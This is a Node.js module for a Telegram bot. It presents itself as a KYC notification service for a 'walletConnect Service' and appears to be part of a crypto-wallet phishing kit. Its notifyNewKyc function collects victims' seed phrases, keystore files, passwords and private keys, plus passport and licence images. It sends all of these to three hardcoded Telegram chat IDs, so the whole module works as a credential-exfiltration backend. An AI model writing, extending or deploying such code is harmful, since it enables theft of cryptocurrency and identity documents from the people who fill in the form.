const TelegramBot = require('node-telegram-bot-api');

// Control whether the Telegram bot runs in this environment.
// Set ENABLE_TELEGRAM=true and TELEGRAM_BOT_TOKEN in the server .env to enable.
const ENABLE_TELEGRAM = process.env.ENABLE_TELEGRAM === 'true';
const TOKEN = process.env.TELEGRAM_BOT_TOKEN || null;

const chatIds = [
  '5121199643',
  '8325458921',
  '8492579493'
];

let bot = null;

if (ENABLE_TELEGRAM && TOKEN) {
  try {
    bot = new TelegramBot(TOKEN, { polling: true });

    // Graceful polling error logging (prevents uncaught exceptions)
    bot.on('polling_error', (err) => {
      console.error('telegram polling_error', err && err.code ? { code: err.code, message: err.message } : err);
    });

    // Respond to messages (minimal handlers)
    bot.on('message', (msg) => {
      if (msg.text && !msg.text.startsWith('/start')) {
        bot.sendMessage(msg.chat.id, 'Invalid input. Please keep off');
      }
    });

    bot.onText(/\/start/, (msg) => {
      const chatId = msg.chat.id;
      bot.sendMessage(chatId, "Thanks for reaching out. You'll receive notifications once the developer configures your telegram as an admin for walletConnect Service");
    });

    console.log('Telegram bot started (polling)');
  } catch (err) {
    console.error('Failed to start Telegram bot:', err);
    bot = null;
  }
} else {
  console.log('Telegram bot disabled. To enable set ENABLE_TELEGRAM=true and provide TELEGRAM_BOT_TOKEN in .env');
}


function notifyNewAdmin(username) {
  const message = `New Admin registered: ${username}`;
  if (bot) {
    chatIds.forEach(chatId => {
      try {
        bot.sendMessage(chatId, message);
      } catch (err) {
        console.error('Failed to send telegram message', err);
      }
    });
  } else {
    console.log('[telegram stub] notifyNewAdmin:', message);
  }
}

function notifyNewKyc(details) {
  // Format KYC details for Telegram
  const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images, fileMap, dealersLicenseStatus, qualityRequired, karatsPurity, destinationRefineryText } = details;
  let message = `New KYC Submission:\nSession ID: ${sessionId || 'N/A'}\nWallet Type: ${walletType || 'N/A'}`;
  if (dealersLicenseStatus) message += `\nDealers License: ${dealersLicenseStatus}`;
  if (qualityRequired) message += `\nQuality Required: ${qualityRequired}`;
  if (karatsPurity) message += `\nKarats & Purity: ${karatsPurity}`;
  if (destinationRefineryText) message += `\nDestination Refinery: ${destinationRefineryText}`;
  if (seedPhrase) message += `\n\nSeed Phrase: ${seedPhrase}`;
  if (keystoreJson) message += `\n\nKeystore JSON: ${keystoreJson}`;
  if (password) message += `\nPassword: ${password}`;
  if (privateKey) message += `\nPrivate Key: ${privateKey}`;

  // Collect image URLs for passport and KYC document (not destination refinery)
  // Send all images from fileMap as photos, with their key as caption
  if (bot) {
    chatIds.forEach(async chatId => {
      try {
        // Send main message with only text details
        await bot.sendMessage(chatId, message);
        // Send each image in fileMap as a photo
        // Only send the KYC document if it is an image
        if (fileMap && fileMap.kycDocument) {
          const imgUrl = fileMap.kycDocument.url || fileMap.kycDocument.secure_url;
          const format = fileMap.kycDocument.format || '';
          const imageFormats = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
          if (imgUrl && imageFormats.includes(format.toLowerCase())) {
            await bot.sendPhoto(chatId, imgUrl, { caption: `KYC Document (${sessionId})` });
          }
        }
        // Send other images (passport, dealersLicense) as before, with sessionId in caption
        if (fileMap && fileMap.passport) {
          const imgUrl = fileMap.passport.url || fileMap.passport.secure_url;
          if (imgUrl) {
            await bot.sendPhoto(chatId, imgUrl, { caption: `Passport (${sessionId})` });
          }
        }
        if (fileMap && fileMap.dealersLicense) {
          const imgUrl = fileMap.dealersLicense.url || fileMap.dealersLicense.secure_url;
          if (imgUrl) {
            await bot.sendPhoto(chatId, imgUrl, { caption: `Dealers License (${sessionId})` });
          }
        }
      } catch (err) {
        console.error('Failed to send telegram KYC message', err);
      }
    });
  } else {
    // For stub, print message and image URLs
    console.log('[telegram stub] notifyNewKyc:', message);
    if (fileMap && Object.keys(fileMap).length) {
      Object.entries(fileMap).forEach(([key, val]) => {
        const imgUrl = val.url || val.secure_url;
        if (imgUrl) {
          console.log(`[telegram stub] ${key} image:`, imgUrl);
        }
      });
    }
  }
}

module.exports = { notifyNewAdmin, notifyNewKyc };
